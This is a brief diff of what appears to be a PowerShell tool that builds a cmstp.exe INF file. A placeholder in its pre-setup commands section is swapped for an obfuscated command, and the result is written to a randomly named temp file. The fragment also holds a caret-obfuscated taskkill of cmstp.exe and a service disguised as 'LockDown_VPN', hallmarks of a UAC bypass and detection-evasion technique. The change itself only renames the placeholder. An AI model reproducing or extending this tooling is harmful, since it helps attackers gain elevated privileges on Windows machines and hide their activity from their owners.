@@ -43,7 +43,7 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-LINE
+MAGIA
 cmd /c "t^a^s^k^k^i^l^l /I^M c^m^s^t^p.^e^x^e /F
 
 [CustInstDestSectionAllUsers]
@@ -55,7 +55,7 @@ cmd /c "t^a^s^k^k^i^l^l /I^M c^m^s^t^p.^e^x^e /F
 [Strings]
 ServiceName="LockDown_VPN"
 ShortSvcName="Net_Svc"
-'@.Replace("LINE", $obfuscatedCommand)
+'@.Replace("MAGIA", $obfuscatedCommand)
 
     $randomName = "config_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".tmp"
     $file = Join-Path $localAppData $randomName
@@ -553,4 +553,5 @@ do {
             $null = Read-Host
         }
     }
+
 } while ($true)
